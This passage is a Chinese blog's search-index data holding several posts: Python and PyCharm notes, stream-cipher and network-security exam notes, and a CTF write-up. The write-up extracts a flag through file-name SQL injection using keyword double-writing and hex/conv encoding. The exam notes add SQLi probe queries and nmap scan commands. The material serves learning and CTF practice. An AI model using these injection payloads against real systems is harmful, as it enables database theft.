得到flag","categories":[{"name":"CTF","slug":"CTF","permalink":"https://singlemindedt.github.io/categories/CTF/"},{"name":"攻防世界","slug":"CTF/攻防世界","permalink":"https://singlemindedt.github.io/categories/CTF/攻防世界/"}],"tags":[{"name":"Web","slug":"Web","permalink":"https://singlemindedt.github.io/tags/Web/"}]},{"title":"Python笔记1","slug":"Python笔记1","date":"2019-12-16T14:47:15.000Z","updated":"2020-06-29T12:17:19.404Z","comments":true,"path":"2019/12/16/Python笔记1/","link":"","permalink":"https://singlemindedt.github.io/2019/12/16/Python笔记1/","excerpt":"","text":"报误：SyntaxError: unexpected EOF while parsing一般是最后一行括号没补全，或者写了for循环没写循环体，因为解释器到底了度没找到它要找到的东西 Python逻辑运算符and or not 优先级：() &gt; not &gt; and &gt; orhttps://www.cnblogs.com/zhangyanran/p/9896070.html Python lower() 方法转换字符串中所有大写字符为小写。语法lower()方法语法：str.lower() ord() 函数是 chr() 函数（对于8位的ASCII字符串）或 unichr() 函数（对于Unicode对象）的配对函数，它以一个字符（长度为1的字符串）作为参数，返回对应的 ASCII 数值，或者 Unicode 数值，如果所给的 Unicode 字符超出了你的 Python 定义范围，则会引发一个 TypeError 的异常。语法以下是 ord() 方法的语法:ord(c) Python join()描述Python join() 方法用于将序列中的元素以指定的字符连接生成一个新的字符串。 语法join()方法语法： str.join(sequence) Python chr() 函数描述chr() 用一个范围在 range（256）内的（就是0～255）整数作参数，返回一个对应的字符。语法以下是 chr() 方法的语法:chr(i)参数i – 可以是10进制也可以是16进制的形式的数字。 Python isalpha() 方法检测字符串是否只由字母组成。 语法isalpha()方法语法： str.isalpha() raw_inputinput它会根据用户输入变换相应的类型,而且如果要输入字符和字符串的时候必须要用引号包起来,而raw_input则是不管用户输入什么类型的都会转变成字符型. 切片https://www.jianshu.com/p/15715d6f4dad Python int() 函数Python 内置函数 Python 内置函数描述int() 函数用于将一个字符串或数字转换为整型。语法以下是 int() 方法的语法:class int(x, base=10)参数x – 字符串或数字。base – 进制数，默认十进制。返回值返回整型数据。 PyCharm安装wordcloud失败解决","categories":[{"name":"notes","slug":"notes","permalink":"https://singlemindedt.github.io/categories/notes/"},{"name":"Python","slug":"notes/Python","permalink":"https://singlemindedt.github.io/categories/notes/Python/"}],"tags":[{"name":"Python","slug":"Python","permalink":"https://singlemindedt.github.io/tags/Python/"}]},{"title":"upload","slug":"upload","date":"2019-12-16T00:14:47.000Z","updated":"2019-12-30T06:03:49.230Z","comments":true,"path":"2019/12/16/upload/","link":"","permalink":"https://singlemindedt.github.io/2019/12/16/upload/","excerpt":"","text":"upload初探 根据题目upload猜测可能为文件上传漏洞，先注册为会员(username:111111;password:111111); 登录就出现了上传文件的页面如下： 尝试上传文件，发现只有jpg格式的文件可以上传尝试上传php.jpg 1&lt;?php echo phpinfo();?&gt; burpsuite抓包改后缀名为php得到结果回应为文件格式错误，应该是服务器端的检查，而非客户端Js过滤； 分析：题目限制了上传文件的后缀名必须为jpg，但并没有对文件内容有所检查；图片马的方法不可行，上传成功后并没有目录，同时无法上传.htaccess对图片马解析； 参阅相关资料发现似乎是利用文件名注入，并且通过每次上传成功后的回显uid is ：1660 大概能够猜测应该是利用文件名对后端数据库进行注入；*后端插入语句： 12INSERT INTO 表名VALUES（被插入新行中的值） 实际操作： 构造payload：（文件名）1'+(select database())+'.jpg 可以看到select被过滤了，尝试双写绕过： 1'+(selselectect database())+'.jpg 页面回显均为0； 尝试转换格式：转为16进制：1'+(selselectect hex(database()))+'.jpg 页面回显为：7765625 分析(回显16进制为纯数字，可能过滤字母；且可能回显位不全)转10进制输出:1'+(selselectect conv(hex(database()),16,10))+'.jpg *MySQL CONV（）将一个数字从一个数字基数系统转换为另一个数字基数系统。转换后，函数返回数字的字符串表示形式。当定义的参数为NULL时，返回值将为NULL。最小基数为2，最大基数为36.如果要转换的基数为负数，则该数字被视为带符号数。否则，它被视为未签名。该函数出现在MySQL版本：5.6语法： 1CONV(N,from_base,to_base) 页面回显为：1.8446744073709552e19 分析(回显科学计数法，应该是输出位数过长)使用substr分割输出：1'+(selselectect conv(substr(hex(database()),1,12),16,10))+'.jpg 页面回显为：131277325825392 转16进制再转为ascll,得到：web_up123456789def changeascll(number): number=str(hex(number))[2:] s1=[number[i:(i+2)]for i in range(0,len(number),2)] s2=[int(i,16)for i in s1] s3=[chr(i)for i in s2] s=\"\".join(s3) print(s)changeascll(131277325825392) 提取后半部分字符：1819238756 1'+(selselectect conv(substr(hex(database()),13,12),16,10))+'.jpg 得到数据库名：web_upload 同样使用上述方法爆表payload：1'+(selecselectt conv(substr(hex((selecselectt table_name frofromm information_schema.tables where table_schema='web_upload' limit 1,1)),1,12),16,10))+'.jpg 114784820031327112615676665705126853610566245得到表名：hello_flag_is_here 爆字段payload:1'+(selecselectt conv(substr(hex((selecselectt column_name frofromm information_schema.columns where table_name='hello_flag_is_here' limit 0,1)),1,12),16,10))+'.jpg 1158583773673987102823得到字段名：i_am_flag 爆值payload：1'+(selecselectt conv(substr(hex((selecselectt i_am_flag frofromm hello_flag_is_here limit 0,1)),1,12),16,10))+'.jpg 3642721569519992806431727430560750951 得到值：1!!_@m_Th.e_F!lag","categories":[{"name":"CTF","slug":"CTF","permalink":"https://singlemindedt.github.io/categories/CTF/"},{"name":"攻防世界","slug":"CTF/攻防世界","permalink":"https://singlemindedt.github.io/categories/CTF/攻防世界/"}],"tags":[{"name":"Web","slug":"Web","permalink":"https://singlemindedt.github.io/tags/Web/"}]},{"title":"安装PyCharm","slug":"安装PyCharm","date":"2019-12-13T00:47:41.000Z","updated":"2019-12-13T04:52:54.257Z","comments":true,"path":"2019/12/13/安装PyCharm/","link":"","permalink":"https://singlemindedt.github.io/2019/12/13/安装PyCharm/","excerpt":"","text":"起因^-^原来用的IDLE，功能很少，就来安装了PyCharm；很简单的安装，一步步坐下来就好；由于之前用IDLE都是在安装路径下运行的，故没有配置环境变量；方便起见配一下；控制面板-系统-高级系统设置-环境变量-系统变量-Path-添加路径； 经过orz安装Python自己在python -v/V上凌乱了，以为是之前安装的一些东西搞坏了，还是重装了QAQ；安装python：https://baijiahao.baidu.com/s?id=1606573927720991570&amp;wfr=spider&amp;for=pc检查环境变量的时候会发现，添加在了用户变量并且添加了两个： 12E:\\newpython3.8.0\\install_location\\Scripts\\E:\\newpython3.8.0\\install_location\\ 12*系统变量：对所有的用户起作用*用户变量：对当前用户起作用 powershell中执行python -V —查看版本(注意是大写V，小写v会抛出很多东西)； 12python -v 小写v:这是版本信息，包括库版本python -V 大写v：只看python的版本 (记录一下，未删去原来的版本3.7.4；怕原来配置的一些东西又用不了了) 安装PyCharm一路傻瓜操作； 进入软件：1.Create New ProjectLocation(存放工程路径),可自行修改，但是最好为空；点击▶project…能看到PyCharm已经获取了3.8.0解释器Base interpreter:路径…python.exeCreate2.等，Tip-&gt;Close添加Project InterpreterFilesettingsOK 3.试运行FilenewPython File输入name ok编写程序运行 结果？？？","categories":[],"tags":[{"name":"环境安装","slug":"环境安装","permalink":"https://singlemindedt.github.io/tags/环境安装/"}]},{"title":"cmd下输入python弹出应用商店","slug":"cmd下输入python弹出应用商店","date":"2019-12-12T16:57:32.000Z","updated":"2019-12-13T04:56:49.241Z","comments":true,"path":"2019/12/13/cmd下输入python弹出应用商店/","link":"","permalink":"https://singlemindedt.github.io/2019/12/13/cmd下输入python弹出应用商店/","excerpt":"","text":"问题：cmd/powershall下运行python均弹窗应用商店解决：在环境变量中可以看到第一条为：%USERPROFILE%\\AppData\\Local\\Microsoft\\WindowsApps%USERPROFILE% : 当前用户配置文件(Profile文件)位置备份后删除，解决！","categories":[],"tags":[{"name":"环境变量","slug":"环境变量","permalink":"https://singlemindedt.github.io/tags/环境变量/"}]},{"title":"序列密码(流密码)","slug":"密码学复习","date":"2019-12-12T07:56:05.000Z","updated":"2020-01-01T11:47:57.040Z","comments":true,"path":"2019/12/12/密码学复习/","link":"","permalink":"https://singlemindedt.github.io/2019/12/12/密码学复习/","excerpt":"","text":"序列密码(流密码)对称密码体制；一次只对明文消息的单个字符(通常是二进制1位)进行加解密变换；具有算法实现简单、速度快、错误传播少等特点； “一次一密”明显缺陷：密钥需要和明文一样长，使密钥的分发和管理困难；故：序列密码设计的思路：从一个短的密钥产生一个随机的密钥序列(由于密钥序列使随机的，计算能力有限的攻击者无法从已知的密钥序列片段中获得其他密钥序列位任何有用信息) 定义明文消息按字符(如二元数字)逐字符的加密；序列密码的加密用一个随机序列(密钥流)与明文序列按位叠加产生密文，用同一随机序列与密文序列叠加来恢复明文； 原理 分类序列密码通常划分为两类：1.同步序列密码2.自同步序列密码 密钥流与密钥生成器密钥流算法应该能产生随机性和不可预测性*好的密钥序列*保持同步是序列密码在实际应用中的关键**现实：密钥流都是按密钥生成算法生成，且要求通信双方能产生相同的密钥序列，所以不可能是真随机的——伪随机序列 密钥流要求1.极大的周期(算法产生的序列都是周期性的，非随机序列)2.良好的统计特征(有均匀的游程分布)@@@游程：序列中相同符号的连续段，其前后均为异种符号 游程：称序列中连续的i个1为长度等于i的1游程， 同样，称序列中连续的i个0为长度等于i的0游程。 ​ ……0 111 0000 10……​ 有长为3的1游程、长为4的0游程、长为1的1游程。一般要求其在周期内满足：同样长度的0游程和1游程的个数相等，或近似相等看作环处理： 问题 个数 位置 长度为1的1游程有几个 1个 0111000010 长度为1的0游程有几个 0个 0111000010(需要前后异号) 长度为2的0游程有几个 1个 0111000010 3.很高的线性复杂度不能用级数较小的线性移位寄存器LFSR近似代替 4.用统计方法由密钥序列k0k1k2…ki…提取密钥生成器结构或种子密钥在计算上不可行密钥流生成器的组成1.驱动部分控制生成器的状态序列，为非线性组合部分提供统计性能良好的序列周期很大分布较随机 2.非线性组合部分F将驱动部分提供的序列组合成密码特性好的序列可隐蔽驱动序列与密钥k之间明显的依赖关系 组成@ 通常由线性移位寄存器(LFSR)和一个非线性组合函数即布尔函数组合，构成一个密钥流生成器。 线性反馈移位寄存器LFSR给定初始状态，写出输出序列；线性反馈移位寄存器（LFSR）； 1.原理：移位寄存器：移入端移入一位，移出端移出一位；结合反馈函数f:选取移位寄存器中的一些单元进行异或操作，反馈给输入端 1.n级LFSR最多有2^n个不同的状态初始状态为零，则其状态恒为零若其初始状态非0，则其后继状态不会为0因此n级LFSR的状态周期≤2^(n)-1**2.输出序列的周期与状态周期相等，所以≤2^n-13.选择合适反馈函数(具有特定抽头序列)，才可使序列周期达到最大值2^(n)-1，周期达到最大值的输出序列称为m序列 LFSR生成最大周期序列条件：其生成多项式(由抽头序列加上常数1形成的多项式)必须是本原多项式，多项式的阶为移位寄存器的级数。 n位寄存器中的初始值称为初态，初态对输出序列的周期没有影响；周期取决于LFSR所使用的反馈函数 解密密文只需运行具有相同初始状态的LFSR即可(循环回初始值，密钥序列开始重复) 特征多项式…定理：n级LFSR产生的序列有最大周期2^(n)-1的必要条件是其特征多项式为不可约 定义：若n次不可约多项式p(x)的阶为2^(n)-1，则称p(x)是n次本原多项式使得p(x)|(x^(p)-1)的最小正整数p称为p(x)的阶 定理：设{ai}∈G(p(x))，{ai}为m序列的充要条件是p(x)为本原多项式； m序列码的破译1.2. 非线性组合部分基于LFSR的序列密码（对一个LFSR进行非线性组合）： 常见的基于LFSR的密钥序列发生器1.Geffe发生器2.钟控发生器3.交错停走式发生器4.门限发生器常见的流密码算法1.RC4基于非线性数组变换；它以一个足够大的数组为基础，对其进行非线性变换，产生非线性的密钥流序列；优点：容易用软件实现，加解密速度快（大约比DES快10倍） RC4主要算法1.密钥调度算法（KSA）2.伪随机数生成算法（PRGA） A5A5算法已被应用于GSM通信系统中，用于加密从手机到基站的连接，以保护语音通信。一个GSM语言消息被转换成一系列的帧，每帧长228位，每帧用A5进行加密 序列序列密码相对于分组密码的优点","categories":[{"name":"cryptography","slug":"cryptography","permalink":"https://singlemindedt.github.io/categories/cryptography/"}],"tags":[{"name":"notes","slug":"notes","permalink":"https://singlemindedt.github.io/tags/notes/"}]},{"title":"hexo卡通挂件踩坑记","slug":"hexo卡通挂件踩坑记","date":"2019-12-12T07:30:52.000Z","updated":"2019-12-12T07:31:43.276Z","comments":true,"path":"2019/12/12/hexo卡通挂件踩坑记/","link":"","permalink":"https://singlemindedt.github.io/2019/12/12/hexo卡通挂件踩坑记/","excerpt":"","text":"添加卡通人物： 1.安装hexo-helper-live2d1nmp install -save hexo-helper-live2d 2.安装live2d1nmp install live2d-widget-model-tororo 注意：可能出现报错可以尝试更新nmp版本： 1nmp install -g nmp 3.配置在hexo站点配置文件_config.yml，或者主题配置文件_config.yml中添加如下配置 123456789101112131415161718192021#宠物live2d: enable: true scriptFrom: local pluginRootPath: live2dw/ pluginJsPath: lib/ pluginModelPath: assets/ model:# use: live2d-widget-model-tororo use: live2d-widget-model-hijiki# use: live2d-widget-model-wanko display: position: right #位置 width: 150 #宽度 height: 300 #高度# 水平位置# hOffset: 0# 垂直位置# vOffset: -20 mobile: show: false #是否在手机端显示 4.部署1hexo g -d 彻底卸载12nmp uninstall hexo-helper-live2d再删除_config.yml下的配置信息； 在博客根目录下package.json文件中可以看到依赖： 安装的live2d模块在根目录的node_moduels文件下； 问题出现了明明安装的tororo但是显示的却是shizuku ??? 将配置文件删除；hexo clean ;hexo g -d;刷新还是有，而且原来配置的在手机端不显示的也同样在显示 …？？？？ 尝试在博客根目录下的_config.yml中添加配置代码： 12345678910111213141516171819202122# Live2D## https://github.com/xiazeyu/live2d-widget.js## https://l2dwidget.js.org/docs/class/src/index.js~L2Dwidget.html#instance-method-initlive2d: model: scale: 1 hHeadPos: 0.5 vHeadPos: 0.618 use: live2d-widget-model-tororo // 下载的动画模型名称 display: superSample: 2 width: 120 height: 200 position: right // 模型在网页显示位置 hOffset: 20 vOffset: 50 mobile: show: false // 移动设备是否显示 scale: 0.5 react: opacityDefault: 0.7 opacityOnHover: 0.2 这下可好了，啥都不显示了QAQ 放在主题下的_config.yml中看看： 模型显示了，不过还是老样子不匹配orz…而且手机端也正常显示。。。 接下来是不是要开始纯净卸载了呢😂3 2 1 Action!……记得多刷新几次！…干净了~舒服！ 尝试手动下载安装：安装模块： 1npm install --save hexo-helper-live2d 直接在github上下载模块：地址：https://github.com/xiazeyu/live2d-widget-models解压将packages里面的所有文件拷贝到博客根目录的node_moduels文件夹下； 打开主题下的配置文件_config.yml，添加如下内容： 123456789101112131415161718live2d: enable: true scriptFrom: local pluginRootPath: live2dw/ pluginJsPath: lib/ pluginModelPath: assets/ tagMode: false debug: false model: use: live2d-widget-model-tororo display: position: right width: 150 height: 300 mobile: show: false react: opacity: 0.7 #不透明度 hexo cleanhexo g -d 老样子，显示不匹配！！！😭","categories":[],"tags":[{"name":"hexo","slug":"hexo","permalink":"https://singlemindedt.github.io/tags/hexo/"}]},{"title":"网络安全复习","slug":"网络安全复习","date":"2019-12-09T07:19:00.000Z","updated":"2019-12-11T10:36:37.105Z","comments":true,"path":"2019/12/09/网络安全复习/","link":"","permalink":"https://singlemindedt.github.io/2019/12/09/网络安全复习/","excerpt":"","text":"网络安全概述1.网络安全的威胁来源（分类）信息泄露、信息破坏、拒绝服务 2.CIA三元组与网络安全基本需求网络安全的基本属性（CIA三元组）：机密性、完整性、可用性五个属性：CIA+可靠性+不可抵赖性八个属性：五+隐私性+可说明性+可审计性 3.网络攻击类型（主动/被动）1.阻断攻击（DoS）2.截取攻击3.篡改攻击4.伪造攻击5.重放攻击 4.OSI安全体系（安全服务与安全机制）安全策略指在一个特定的环境里（安全区域），为保证提供一定级别的安全保护所必须遵守的一系列条列、规则。 安全服务指用于提高网络中信息传输、存储和处理过程安全的服务。5个安全服务：认证：提供对通信中对等实体和数据来源的鉴别访问控制：防止对资源的非授权使用机密性：对数据提供保护，防止被非授权泄露完整性：保证信息精确的从起点到终点，不受真实性、完整性和顺序性的攻击不可否认：提供源发证明和交付证明，是通信双方均不可抵赖 安全机制是一种技术或措施，一种软件或者实施一个或多个安全服务的过程。8个安全机制：加密、数字签名、访问控制、信息完整性、鉴别交换、业务量填充、路由控制、公证 5.等级保护制度对不同对象、事件，分等级响应、处置。五级：用户自主保护级-&gt;系统审计保护级-安全标记保护级-结构化保护级-访问验证保护级每级安全技术要求：5个：物理安全、网络安全、主机系统安全、应用安全、数据安全 黑客攻击流程&amp;渗透测试6.黑客攻击流程(重点-简答题)踩点-&gt;扫描-&gt;查点-&gt;访问（获取访问权限失败-&gt;拒绝服务）-&gt;提权-&gt;窃取信息-&gt;掩盖踪迹-&gt;创建后门 收集信息阶段：踩点、扫描、查点 7.踩点找出感兴趣的目标，并收集与目标相关的信息的过程；途径：1.公开信息源搜索2.WHOIS查询3.DNS查询:dig、nslookup、fierce4.网络侦察：利用Unix/Linux下系统提供的traceroute程序、Windows下tracert探查网络拓补结构; 8.渗透测试步骤(重点-简答题)1.前期交互2.情报收集3.威胁建模4.漏洞分析5.渗透攻击（MSF）6.后渗透攻击7.报告 9.常用命令与工具(掌握)ping,nslookup,host,hostnew,traceroute(tracert),nmap,telnet,net,dig,whois ping:（1）用来检测网络的连通情况和分析网络速度； （2）根据域名得到服务器IP； （3）根据ping返回的TTL值来判断对方所使用的操作系统及数据包经过路由器数量。 我们通常会用它来直接ping IP地址，来测试网络的连通情况。 nslookup:用于查询DNS的记录，查询域名解析是否正常，在网络故障时用来诊断网络问题 host:把一个主机名解析到一个网际地址或把一个网际地址解析到一个主机名。hostnew 命令是 host 命令的 5.2 版. traceroute(tracert):Traceroute是Linux和Mac OS等系统默认提供的路由追踪小程序，Tracert是Windows系统默认提供的路由追踪小程序。二者的功能相同，都能探测数据包从源地址到目的地址经过的路由器的IP地址。 nmap:一个网络连接端扫描软件，用来扫描网上电脑开放的网络连接端。确定哪些服务运行在哪些连接端，并且推断计算机运行哪个操作系统（这是亦称 fingerprinting）。 Telnet:用于远程登录到网络中的计算机,并以命令行的方式远程管理计算机。需要注意的是,远程机器必须启动telnet服务器,否则无法打开telnet命令。 net:https://blog.csdn.net/zhailihua/article/details/75561963 dig:dig命令是常用的域名查询工具，可以用来测试域名系统工作是否正常 whois:是用来查询域名的IP以及所有者等信息的传输协议。简单说，whois就是一个用来查询域名是否已经被注册，以及注册域名的详细信息的数据库（如域名所有人、域名注册商）。 网络扫描与查点技术10.扫描的基本步骤一个完整的扫描过程通常包括三个阶段：（1）确定目标系统是否存活（2）确定存活系统上运行的服务（端口扫描技术）（3）探查目标系统运行的操作系统类型（旗标抓取技术+协议指纹识别技术） 11.端口扫描的类型（7种）：原理与NMAP实现1.TCP连接扫描（TCP Connect()扫描） nmap -sT完成一次完整的三次握手过程；2.TCP SYN扫描（半开扫描） nmap -sS隐蔽性好，不完成完整的连接；3.TCP FIN扫描(秘密扫描) nmap -sF向主机发送FIN数据包；变体：(1)TCP圣诞树(TCP Xmas-Tree)：将FIN、PSH、VRG标志位置1(2)TCP 空(TCP NULL)：将所有标志位置04.TCP ACK扫描 nmap -sA测试防火墙的规则集；5.TCP窗口扫描 nmap -sW返回值为正–端口开放返回值为0–端口关闭6.TCP Maimon扫描 nmap -sM7.UDP扫描 nmap -sU向目标端口发送UDP数据包；若返回“ICMP port unreachable”表名端口关闭，否则开放；不可靠，速度慢； 12.扫描的防御端口扫描其实就是通过对计算机每个常用端口发送数据包，通过返回的数据包来分析其弱点加以攻击。如何进行防范呢？其实最简单的办法就是关闭不用的端口，减低端口扫描风险，然后在对开启的端口做好防范措施（防火墙）。 口令破解与防御13.常用的口令破解方法1.暴力破解(穷举)(彩虹表)2.字典攻击(穷举预设字典中的口令组合)3.组合攻击(在字典口令的基础上在末尾+数字或字母)4.社会工程学 14.Windows，Linux口令安全原理Windows：安全账号管理器SAM机制；Win口令文件：%systemroot%system32\\config\\SAM LM-Hash将用户口令转为大写，不足14位用0填充，超过截尾14位，分为两组7位分别加密为两个DES加密密钥，再分别加密预定义的魔术字符串，获得两个8位密文值，连接起来即为LM-Hash值；不区分大小写，安全强调降低淘汰 NT-Hash将口令转为Unicode字符串，然后进行MD4单向Hash计算，产生128bit的Hash值； Windowa的登录与身份验证交互式登录、网络登录 NTLM采用挑战/响应机制进行身份验证；(掌握)6步：三方交互：客户端：K 服务器：F 账号数据库：DB1.认证请求(K-&gt;F)2.挑战(F-&gt;K)3.响应(K-&gt;F)4.验证请求(F-&gt;DB)5.验证响应(DB-&gt;F)6.服务器响应(F-&gt;K) Linux(熟记)用户名与ID关系文件：/etc/passwd口令字段：/etc/shadow过去：使用单向加密函数加密口令现在：系统根据日期选择salt值，并转为2个字符的字符串，与加密后的口令一起保存； 15.Linux常用命令（chmod,ls,ps,passwd,su,sudo等）(熟记)chmod：使用权限 : 所有使用者使用方式 : chmod [-cfvR] [–help] [–version] mode file…说明 : Linux/Unix 的档案调用权限分为三级 : 档案拥有者、群组、其他。利用 chmod 可以藉以控制档案如何被他人所调用。ls:功能： 列出非目录的文件项，然后是每一个目录中的“可显示”文件（可理解为ls命令将本目录向下展开两级）ls用法：ls [参数] [目录名]（如过要显示当前目录的文件可不加目录名）ps:使用该命令可以确定有哪些进程正在运行和运行的状态、进程是否结束、进程有没有僵尸、哪些进程占用了过多的资源等passwd:用来更改使用者的密码su:用于变更为其他使用者的身份，除 root 外，需要键入该使用者的密码。使用权限：所有使用者。sudo:以系统管理者的身份执行指令，也就是说，经由 sudo 所执行的指令就好像是 root 亲自执行。使用权限：在 /etc/sudoers 中有出现的使用者。 16.口令破解与防御口令破解Win：利用漏洞获取管理员权限，利用Pwdump等工具获取NT在注册表中存储的SAM口令散列，口令破解；Linux：获取root用户权限，获取shadow口令散列，口令破解； 口令破解防御1.强口令2.口令策略3.防御口令泄露、删除和修改 欺骗技术与防御17.IP欺骗*伪造某台主机IP地址的技术(被伪装的主机往往具有某种特权或者被另外的主机所信任) 简单的IP欺骗1.伪装主机从而进行泛洪攻击以达到拒绝服务的目的；2.监听被伪装者与受害者之间的返回数据流TCP协议：主机间无法完成正常3握手，即无法进行数据传输UDP协议：面向无连接的协议，攻击者发送的数据包可以被发送给目标主机；导致拒绝服务； 源路由攻击攻击者在IP欺骗数据包中的源路由字段填入攻击者的IP地址，则返回的数据包就必须经过攻击者； TCP会话劫持接管现存动态会话的过程，攻击者冒充一方用户，同时监听并掌握会话内容； 过程：1.发现攻击目标(必须能检测到目标主机的通信流)2.确认会话状态3.猜测序列号4.使客户主机下线(DoS攻击)5.接管会话，在服务器上创建后门 防御1.放弃以地址为基础的验证2.进行包过滤入口过滤：不允许任何从外网进入内网的数据包使用内网的IP地址作为源地址出口地址：来自内网的地址使用了不属于内网的源地址，内网用户发起的欺骗攻击 3.加密通信时要求加密传输和验证 4.使用随机的初始序列号5.禁用路由器的源路由18.ARP欺骗*(掌握)攻击者处于局域网内部，基于ARP协议的缺陷发送虚假的ARP请求或响应，就是ARP欺骗；(Windows arp -a) ARP缺陷1.不验证自己是否发过对应的ARP请求2.不验证该回应包是否可信3.直接用应答包替换ARP缓存表中的原有信息(主机和网关维护一张IP-MAC地址映射表，攻击者可向目标主机发送虚假的ARP回应包(将MAC地址设为自己的MAC地址)，成为”中间人”,使所有的数据包都会流经攻击者的网卡) ARP欺骗检测网络频繁掉线、变卡、arp -a查看映射表发现网关MAC地址与真实不符、使用嗅探工具发现网络中有大量的ARP响应包(Ettercap)… ARP欺骗防御1.静态绑定a.MAC地址绑定b.使用静态ARP缓存2.ARP防火墙3.使用ARP服务器(确保服务器不被欺骗)4.及时隔离被欺骗的主机 19.DNS欺骗(掌握)又称DNS域名重定向或域名劫持，是通过拦截域名解析请求或篡改域名服务器上的数据，使得用户在访问相关域名时返回虚假IP地址或使用户的请求失败的攻击方式。 DNS欺骗一般过程(如果能获得DNS服务器的控制权再好不过，直接伪造一条记录就好，但是很难。尝试控制DNS服务器所在网络下的一台主机，监听网络通信，利用ARP、IP欺骗取得信任后，攻击者嗅探目标主机发送的DNS请求数据包，分析ID和端口号，构造DNS应答包，若发送的应答包ID和端口正确，则把返回的数据包中的域名和IP地址存进DNS缓存表，真实的DNS应答包被丢弃) DNS欺骗防御1.DNS服务器软件安装补丁2.限制DNS动态更新3.限制区域传送4.关闭DNS服务器的递归查询 20.电子邮件欺骗与邮件安全（PGP）攻击主要表现1.电子邮件炸弹、”滚雪球”、垃圾邮件2.自称管理员，假冒，附件木马 基本方法1.相似的电子邮件地址2.冒充回复地址3.利用附件欺骗4.远程登录到SMTP端口25发送邮件 防御1.树立风险意识2.对邮件加密签名 Web攻击与防御21.SQL注入原理、分类、攻击过程（程序分析能力）*(掌握)原理利用Web应用对后台数据库查询语句处理存在安全漏洞，攻击者提供构造的数据库查询代码，根据返回结果得到目的数据。受影响系统 ：对输入参数不进行检查和过滤就是通过把SQL命令插入到Web表单递交或输入域名或页面请求的查询字符串，最终达到欺骗服务器执行恶意的SQL命令。 分类1.普通注入根据数据库提示的有价值的信息进行注入 2.盲注有经验的管理员在给出错误提示页面时，不提供详细的错误信息，攻击者要对表中的每个字段逐字猜解 注入点类型1.数字型12...index.php?id=1select * from 表名 where id=1； 2.字符型12...index.php?name=adminselect * from 表名 where name='admin'; SQLi方法判断是否存在注入： 12and 1=1 #返回正常页面and 1=2 #返回错误页面或空页 布尔型注入基于时间延迟注入可联合查询注入多语句查询注入 SQLi过程客户端(参数值等数据被修改)–&gt;服务端(未经检查和过滤，将被修改的数据注入到SQL语句中，SQL语句功能被修改)–&gt;数据库引擎(执行被修改后的SQL命令)–&gt;服务端(将注入的结果返回客户端)–&gt;客户端(根据上一次注入获得的敏感信息，构造注入语句进一步注入)1.寻找注入点(存在SQLi漏洞的连接)2.测试该网站是否存在SQLi漏洞3.猜解数据库名-&gt;表名-&gt;字段名-&gt;表的内容(*重点查询与用户相关的表，获取用户名+密码(管理员优先))4.后续攻击 注入实例1.形如： 12...index.php?id=1select * from 表名 where id=1； 2.测试有无漏洞?id=1’ 报错，若有返回信息，可能可以确定后台数据库版本型号在末尾加and 1=1 \\and 1=23.猜解表名末尾加and exists(select * from admin)若返回正常页面，则存在admin表4.猜解字段名在末尾加and exists(select username from admin)若返回正常页面，则存在username字段在末尾加and exists(select password from admin)若返回正常页面，则存在password字段5.猜解用户名(折半查找)and 1=(select id from (select * from admin where id=1)where asc(mid(username,1,1))&lt;100) 工具SQLmap等 SQLi防御(需要掌握简单的代码修改方式以抵御SQLi攻击)1.使用预编译语句，绑定变量2.对用户提交的数据和参数进行严格的过滤(,’’;等)3.摒弃动态SQL语句，改用存储过程来访问和操作数据4.使用安全函数5最小权限原则，区分普通用户与管理员权限避免Web应用直接使用root等高权限用户直接连接DB 22.XSS原理、分类、攻击过程（程序分析能力）*(掌握)通常指的是通过利用网页开发时留下的漏洞，通过巧妙的方法注入恶意指令代码到网页，使用户加载并执行攻击者恶意制造的网页程序。这些恶意网页程序通常是JavaScript，但实际上也可以包括Java、 VBScript、ActiveX、 Flash 或者甚至是普通的HTML。攻击成功后，攻击者可能得到包括但不限于更高的权限（如执行一些操作）、私密网页内容、会话和cookie等各种内容。 攻击条件Web服务器没有对用户输入进行有效验证或验证强度不够，而又轻易将他们返回给客户端；一般需要：1.存在跨站脚本漏洞的Web应用2.用户点击或浏览某个页面 分类1.反射型也叫非持久型XSS，是指发生请求时，XSS代码出现在请求URL中，作为参数提交到服务器，服务器解析并响应。响应结果中包含XSS代码，最后浏览器解析并执行。从概念上可以看出，反射型XSS代码是首先出现在URL中的，然后需要服务端解析，最后需要浏览器解析之后XSS代码才能够攻击。（简单地将用户输入数据返回给浏览器，黑客需要诱导用户点击一个恶意链接） 2.存储式永久存储在服务器数据库或者文件中 3.DOM型与前两种区别：不需要服务器解析响应，而是浏览器的DOM解析器触发 攻击过程参考： https://www.cnblogs.com/mao2080/p/9460397.html xss防御(需要掌握简单的代码修改方式以抵御XSS攻击)1.输入参数字符过滤2.输出参数进行转码3.限制输入参数长度4.设置cookie httponly为true 1） 方法一：给Cookie添加HttpOnly属性, 这种属性设置后, 只能在http请求中传递, 在脚本中, document.cookie无法获取到该Cookie值. 对XSS的攻击, 有一定的防御值. 但是对网络拦截, 还是泄露了.2）方法二：在cookie中添加校验信息, 这个校验信息和当前用户外置环境有些关系,比如ip,user agent等有关. 这样当cookie被人劫持了, 并冒用, 但是在服务器端校验的时候, 发现校验值发生了变化, 因此要求重新登录, 这样也是种很好的思路, 去规避cookie劫持.3）方法三：cookie中session id的定时更换, 让session id按一定频率变换, 同时对用户而言, 该操作是透明的, 这样保证了服务体验的一致性.（ 可参考：https://www.cnblogs.com/momjs/p/10346579.html ） 23.其他Web攻击类型*CSRF攻击：https://www.cnblogs.com/collin/articles/9637999.html文件上传漏洞：指由于程序员未对上传的文件进行严格的验证和过滤，而导致的用户可以越过其本身权限向服务器上上传可执行的动态脚本文件。这里上传的文件可以是木马，病毒，恶意脚本或者WebShell等。这种攻击方式是最为直接和有效的，“文件上传”本身没有问题，有问题的是文件上传后，服务器怎么处理、解释文件。如果服务器的处理逻辑做的不够安全，则会导致严重的后果。 命令执行漏洞：https://www.cnblogs.com/bmjoker/p/9084864.htmlxxe漏洞 ：https://www.freebuf.com/articles/web/177979.html 24.Web攻击的防御*缓冲区溢出攻击与防御(掌握)25.缓冲区溢出原理(代码分析能力)缓冲区：计算机在内存中开辟的一段连续的内存块，用于存放相同类型的数据 原理向固定长度的缓冲区中写入超出其预定长度的内容，导致缓冲区数据溢出，从而覆盖其周围的内存空间黑客借此精心构造填充数据，导致原有的流程改变，转去执行特殊代码，从而获得控制权 缓冲区溢出攻击过程(要求能根据代码分析溢出原理)1.在程序的地址空间中安排适当的代码2.通过适当的初始化寄存器和存储器，让程序跳转到安排好的地址空间执行 26.栈溢出（程序分析能力）*27.其他溢出的工作原理格式化字符串溢出整数溢出堆溢出 